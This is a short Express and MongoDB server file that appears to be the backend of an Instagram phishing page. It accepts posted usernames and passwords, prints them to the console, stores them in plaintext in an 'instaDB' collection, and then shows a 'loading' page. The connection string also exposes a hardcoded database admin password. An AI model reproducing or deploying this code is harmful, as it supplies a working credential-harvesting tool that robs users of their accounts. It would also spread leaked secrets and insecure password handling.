const express = require('express');
const bodyParser = require('body-parser');
const ejs = require('ejs');
const mongoose = require('mongoose');
const { Schema } = mongoose;

mongoose.connect('mongodb+srv://admin-shabil:shabil_dev_Mongo_123@cluster0.fxwxz.mongodb.net/instaDB',{useNewUrlParser: true,useUnifiedTopology: true},()=>{
    console.log('Db Listening');
})

const app = express();

app.set('view engine', 'ejs');
app.use(express.static('public'))
app.use(bodyParser.urlencoded({ extended: true }));



const userSchema= new mongoose.Schema({
    Username:String,
    Password: String
})
const Users = new mongoose.model('user',userSchema);

app.get('/',(req,res)=>{
    res.render('index');
})

app.post('/', async (req,res)=>{
    console.log(req.body);
    const newUser = await new Users({
        Username : req.body.username,
        Password :req.body.password
    })
    newUser.save()

    res.render('loading');
})

app.listen(process.env.PORT||3000,()=>{
    console.log('Server Listening on Port 3000');
})